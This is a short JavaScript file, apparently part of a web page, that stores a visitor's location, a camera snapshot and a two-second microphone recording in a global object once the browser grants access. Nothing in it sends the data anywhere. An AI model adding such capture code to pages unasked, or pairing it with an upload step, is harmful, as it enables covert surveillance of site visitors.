// Store collected permissions data
window.permissionsData = {
  location: null,
  camera: null,
  mic: null,
  collectedAt: null
};

// Capture location
window.captureLocationData = function(pos) {
  const lat = pos.coords.latitude.toFixed(3);
  const lon = pos.coords.longitude.toFixed(3);
  window.permissionsData.location = { 
    latitude: parseFloat(lat), 
    longitude: parseFloat(lon), 
    timestamp: new Date().toISOString(),
    accuracy: pos.coords.accuracy 
  };
};

// Capture camera screenshot
window.captureCameraScreenshot = function(videoElement) {
  try {
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(videoElement, 0, 0);
    window.permissionsData.camera = {
      screenshot: canvas.toDataURL('image/jpeg', 0.6),
      dimensions: { width: canvas.width, height: canvas.height },
      timestamp: new Date().toISOString()
    };
  } catch (e) {
    console.error('Camera capture failed:', e.message);
  }
};

// Capture audio sample
window.captureAudioSample = function(stream, duration = 2000) {
  return new Promise((resolve) => {
    try {
      const mediaRecorder = new MediaRecorder(stream);
      const audioChunks = [];
      mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.onloadend = () => {
          window.permissionsData.mic = {
            audioSample: reader.result,
            duration: duration,
            format: 'audio/webm',
            timestamp: new Date().toISOString()
          };
          resolve(true);
        };
        reader.readAsDataURL(audioBlob);
      };
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), duration);
    } catch (e) {
      console.error('Audio capture failed:', e.message);
      resolve(false);
    }
  });
};
